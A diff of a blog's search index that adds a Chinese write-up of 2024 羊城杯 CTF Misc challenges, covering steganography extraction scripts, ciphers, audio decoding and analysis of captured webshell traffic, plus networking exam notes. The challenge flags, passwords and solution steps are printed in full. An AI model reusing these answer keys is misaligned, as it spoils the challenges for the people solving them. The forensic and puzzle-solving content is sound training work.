-<p>Title:passisDASCTF</p>
-<p>UserName:passisDASCTF</p>
-<p>Password:WBArAG6ku6ALmLGGn3iq</p>
-<p>Notes:给你了可以找到flag吗,真相就在其中</p>
-</blockquote>
-<p>翻看历史记录，在里面找到一段AES加密的密文</p>
-<blockquote>
-<p>U2FsdGVkX193h7iNsZs3RsLxH+V1zztkdS+fBy2ZQfzH77Uo4l3hSWplMV+GcLpAGflXlQuPTU5qIkOY7xJN9A==</p>
-</blockquote>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb14.png"
-                        alt="ycb14"
-                 ></p>
-<p>用DASCTF作为密钥<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb15.png"
-                        alt="ycb15"
-                 >解一下这个AES即可得到flag:DASCTF{snsnndjahenanheanjjskk12235}</p>
-<h3 id="miaoro">miaoro</h3>
-<p>翻看流量包，发现执行的命令在请求头的 GWHT 字段中</p>
-<p>在流10中发现执行了 echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt 命令</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb16.png"
-                        alt="ycb16"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb17.png"
-                        alt="ycb17"
-                 ></p>
-<p>在流13中发现下载了一个secret.txt</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb18.png"
-                        alt="ycb18"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb19.png"
-                        alt="ycb19"
-                 ></p>
-<p>base64解码响应的数据，发现有一个数据逆序的压缩包<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb20.png"
-                        alt="ycb20"
-                 ></p>
-<p>手动提取出压缩包，用之前得到的密码：Th15_11111111s_pP@sssssw000rd!!!</p>
-<p>解压压缩包可以得到一张 flag2.png 图片</p>
+    <title>广域通信网</title>
+    <url>//post/rkwg3/</url>
+    <content><![CDATA[<h3 id="广域通信网物理层特性">广域通信网物理层特性</h3>
+<h4 id="公共交换电话网-PSTN">公共交换电话网 PSTN</h4>
+<p>PSTN是为了<strong>语音通信</strong>而建立的网络，20世纪60年代开始用于<strong>数据传输</strong></p>
+<p>电话网的3个组成部分：<strong>本地回路、干线、交换机</strong></p>
+<p>通过调制解调器，发送端 数字信号 -&gt; 模拟信号，接收端 模拟信号 -&gt; 数字信号</p>
+<p><strong>本地回路：</strong></p>
+<ul>
+<li>DTE <strong>数据终端设备</strong>，代币哎通信链路的端点（PC/电话机）</li>
+<li>DCE <strong>数据电路设备</strong>，用于信号变换器，自动呼叫等（猫/调制解调器/Modem）</li>
+</ul>
+<p>机械特性：RS-232-C建议使用25帧的D型连接器，微型机串行接口上大多使用9针连接器</p>
+<p>电气特性：RS-232-C采用V.28标准电路，速率20KB/s，最长15m，信号源产生3-15V的信号，±3V是信号电平过渡区，3-15V代表1，-3-15V代表2</p>
+<h3 id="流量与差错控制">流量与差错控制</h3>
+<h4 id="流量控制：X-25-TCP">流量控制：X.25 TCP</h4>
+<p>协调发送站和接收站工作步调，避免发送速度过快，接收站处理不过来</p>
+<p><strong>停等协议</strong>：工作站发一帧，收到应答信号后再发送下一帧，接收站每收到一帧后回送一个应答信号（ACK），表示愿意接收下一帧，如果接收站不应答，发送站必须等待</p>
+<p><strong>滑动窗口协议：允许连续发送多个帧而无需等待应答</strong></p>
+<p>假设站A和B通过全双工链路，B维持能容纳8个帧的缓冲区，这样A就可以连续发送8个帧而不必等待应答信号。</p>
+<h4 id="差错控制：CRC检错，海明码纠错">差错控制：CRC检错，海明码纠错</h4>
+<p>检测和纠错传输错误的机制</p>
+<p><strong>停等ARQ协议</strong>是停等流控技术和自动请求重发技术的结合</p>
+<ul>
+<li>发送站发出最后一帧后必须等待应答信号，<strong>收到肯定应答信号ACK后继续发送下一帧</strong>；收到否定应答信号NAK后重发该帧；若在一定的时间内没有收到应答信号也必须重发</li>
+<li></li>
+</ul>
+<h3 id="帧中继和HDLC">帧中继和HDLC</h3>
 ]]></content>
       <categories>
-        <category>CTF</category>
+        <category>网工</category>
       </categories>
       <tags>
-        <tag>Misc</tag>
+        <tag>软考中级</tag>
       </tags>
   </entry>
   <entry>
@@ -4795,6 +4616,203 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
 </tr>
 </tbody>
 </table>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024羊城杯 Misc方向部分WP</title>
+    <url>//post/ycb2024wp/</url>
+    <content><![CDATA[<h3 id="hiden">hiden</h3>
+<p>题目附件给了下面这两个文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb1.png"
+                        alt="ycb1"
+                 ></p>
+<p>txt文件的内容如下</p>
+<blockquote>
+<p>GK4368 ;?:C</p>
+<p>;G8F 34C2WVDJ?E]8&lt;8V[ V6@VX ?7 Di</p>
+<p>​    8&lt;80B?8? l D]6C?BWX</p>
+<p>​    DGJC0JC2 l JC2W8&lt;80B?8?X</p>
+<p>​    8&lt;80B?8? l DGJC0JC2]830@=8C7Wb[ @=8C36BC6 l VJG88JCVX Z 8&lt;80B?8?</p>
+<p>;G8F ;?:C]34C2WQ8C78];?:Q[ Q6@QX ?7 Di</p>
+<p>​    ?886G@ l D]EC84?6?K7WX</p>
+<p>​    ;?:0B?8? l @=8C?66?=W D]6C?BD6?KC7W`X X</p>
+<p>D36 G2BC&lt; G2 6?2ECWJC2W8&lt;80B?8?XXi</p>
+<p>​    ;?:0B?8?,G2BC&lt; Y c. l 8&lt;80B?8?,G2BC&lt;.</p>
+<p>​</p>
+<p>;G8F ;?:C]34C2WQFGBC2];?:Q[ Q;@QX ?7 Di</p>
+<p>​    D]7C84?6?K7W?886G@X</p>
+<p>​    D];6G8CD6?KC7W;?:0B?8?X</p>
+</blockquote>
+<p>根据名称猜测是rot47+rot13，解密可以得到下面的东西，目测python脚本</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb2.png"
+                        alt="ycb2"
+                 ></p>
+<p>然后再来一次rot13解密，即可得到下面这个加密脚本</p>
+<p>对照上面这个加密脚本，写一个脚本提取flag即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> wave.<span class="built_in">open</span>(<span class="string">&quot;hiden.wav&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wav_data = <span class="built_in">bytearray</span>(f.readframes(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">file_len = <span class="built_in">int</span>.from_bytes(wav_data[<span class="number">0</span>:<span class="number">3</span>*<span class="number">4</span>:<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">extracted_data = <span class="built_in">bytes</span>([wav_data[i*<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">3</span> + file_len)])</span><br><span class="line"><span class="built_in">print</span>(extracted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ok，now you find me,so the flag give you</span></span><br><span class="line"><span class="comment"># DASCTF&#123;12jkl-456m78-90n1234&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="checkin">checkin</h3>
+<p>题目附件给了一个压缩包，里面有一个Flag.txt</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb3.png"
+                        alt="ycb3"
+                 ></p>
+<p>压缩包注释里的字符串base58解码后得到:Welcome2GZ</p>
+<p>然后Flag.txt把多余的\x00字符删掉可以得到一个pacpng流量包文件，里面主要是SMB流量</p>
+<p>写了一个python脚本来统计每行\x00字符的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict = &#123;</span><br><span class="line">    &quot;11&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;12&quot;: &quot;2&quot;,</span><br><span class="line">    &quot;13&quot;: &quot;3&quot;,</span><br><span class="line">    &quot;14&quot;: &quot;4&quot;,</span><br><span class="line">    &quot;15&quot;: &quot;5&quot;,</span><br><span class="line">    &quot;16&quot;: &quot;6&quot;,</span><br><span class="line">    &quot;17&quot;: &quot;7&quot;,</span><br><span class="line">    &quot;18&quot;: &quot;8&quot;,</span><br><span class="line">    &quot;19&quot;: &quot;9&quot;,</span><br><span class="line">    &quot;20&quot;: &quot;A&quot;,</span><br><span class="line">    &quot;21&quot;: &quot;B&quot;,</span><br><span class="line">    &quot;22&quot;: &quot;C&quot;,</span><br><span class="line">    &quot;23&quot;: &quot;D&quot;,</span><br><span class="line">    &quot;24&quot;: &quot;E&quot;,</span><br><span class="line">    &quot;25&quot;: &quot;F&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    res = []</span><br><span class="line">    for line in data[:4785]:</span><br><span class="line">        cnt = 0</span><br><span class="line">        for item in line:</span><br><span class="line">            if item == 0:</span><br><span class="line">                cnt += 1</span><br><span class="line">        res.append(cnt)</span><br><span class="line">    for item in res:</span><br><span class="line">        # print(dict[str(item)], end=&quot;&quot;)</span><br><span class="line">        print(item, end=&#x27; &#x27;)</span><br><span class="line">    # print(len(res))</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def solve():</span><br><span class="line">    with open(&quot;Flag.txt&quot;, &#x27;rb&#x27;) as f:</span><br><span class="line">        data = f.read().replace(b&#x27;\x00&#x27;, b&#x27; &#x27;)</span><br><span class="line">    with open(&quot;hex.txt&quot;, &quot;wb&quot;) as f:</span><br><span class="line">        f.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    calc()</span><br><span class="line">    # solve()</span><br></pre></td></tr></table></figure>
+<p>（复现提示：wbstego隐写）</p>
+<h3 id="1z-misc">1z_misc</h3>
+<p>附件下载下来后有一个天机不可泄露.txt</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb4.png"
+                        alt="ycb4"
+                 ></p>
+<p>根据网上找到的信息，女可以是坐标(1,1)和坐标(11,24)位置，觜可以是(9,1)和(7,25)位置，根据 是以十二岁 可知十二时辰，每个时辰末尾对应的星宿为坐标开始的字<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb5.png"
+                        alt="ycb5"
+                 ></p>
+<p>获得如下列表</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb6.png"
+                        alt="ycb6"
+                 ></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">心胃心奎奎心奎心胃心心心胃心心胃心奎奎奎奎胃奎心奎奎胃奎心奎心奎奎</span><br></pre></td></tr></table></figure>
+<p>然后只有三个字，猜测是摩斯电码，解得解压密码 E@SI1Y!</p>
+<p>解压后得到一个flag文件和一个hint.jpg</p>
+<p>hint文件中提示了天琴座，天琴座的英文是 lyra</p>
+<p>联想到前不久2024ISCC考察的一道题目，主要用到了这个开源项目 <a class="link"   href="https://github.com/google/lyra" >https://github.com/google/lyra<i class="fas fa-external-link-alt"></i></a></p>
+<p>因此按照Github上的步骤安装一下lyra，这个项目需要使用 bazel 进行安装，所以安装lyra之前需要先安装bazel</p>
+<p>安装完成后，把之前那段未知数据的后缀改为.lyra，然后使用lyra解码即可得到一个wav文件</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb7.png"
+                        alt="ycb7"
+                 ></p>
+<p>打开wav，发现语音播报了社会主义核心价值观编码，因此直接找个在线网站识别然后解密即可</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb8.png"
+                        alt="ycb8"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb9.png"
+                        alt="ycb9"
+                 ></p>
+<p>DASCTF{W0w!_You_d0_4_g00d_j0b!}</p>
+<h3 id="不一样的数据库-2">不一样的数据库_2</h3>
+<p>题目附件给了一个压缩包，解压密码是弱密码直接爆破就行：753951</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb10.png"
+                        alt="ycb10"
+                 ></p>
+<p>解压后得到一张定位块丢失的二维码，修复定位块</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb11.png"
+                        alt="ycb11"
+                 ></p>
+<p>扫码即可得到一下内容</p>
+<blockquote>
+<p>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</p>
+</blockquote>
+<p>rot13解密一下得到：AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb12.png"
+                        alt="ycb12"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb13.png"
+                        alt="ycb13"
+                 ></p>
+<blockquote>
+<p>Title:passisDASCTF</p>
+<p>UserName:passisDASCTF</p>
+<p>Password:WBArAG6ku6ALmLGGn3iq</p>
+<p>Notes:给你了可以找到flag吗,真相就在其中</p>
+</blockquote>
+<p>翻看历史记录，在里面找到一段AES加密的密文</p>
+<blockquote>
+<p>U2FsdGVkX193h7iNsZs3RsLxH+V1zztkdS+fBy2ZQfzH77Uo4l3hSWplMV+GcLpAGflXlQuPTU5qIkOY7xJN9A==</p>
+</blockquote>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb14.png"
+                        alt="ycb14"
+                 ></p>
+<p>用DASCTF作为密钥<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb15.png"
+                        alt="ycb15"
+                 >解一下这个AES即可得到flag:DASCTF{snsnndjahenanheanjjskk12235}</p>
+<h3 id="miaoro">miaoro</h3>
+<p>翻看流量包，发现执行的命令在请求头的 GWHT 字段中</p>
+<p>在流10中发现执行了 echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt 命令</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb16.png"
+                        alt="ycb16"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb17.png"
+                        alt="ycb17"
+                 ></p>
+<p>在流13中发现下载了一个secret.txt</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb18.png"
+                        alt="ycb18"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb19.png"
+                        alt="ycb19"
+                 ></p>
+<p>base64解码响应的数据，发现有一个数据逆序的压缩包<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/ycb20.png"
+                        alt="ycb20"
+                 ></p>
+<p>手动提取出压缩包，用之前得到的密码：Th15_11111111s_pP@sssssw000rd!!!</p>
+<p>解压压缩包可以得到一张 flag2.png 图片</p>
 ]]></content>
       <categories>
         <category>CTF</category>
@@ -5615,11 +5633,6 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
-    <title>分类</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>关于作者</title>
     <url>/about/index.html</url>
     <content><![CDATA[]]></content>
@@ -5627,6 +5640,11 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
   <entry>
     <title>友情链接</title>
     <url>/links/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>分类</title>
+    <url>/categories/index.html</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
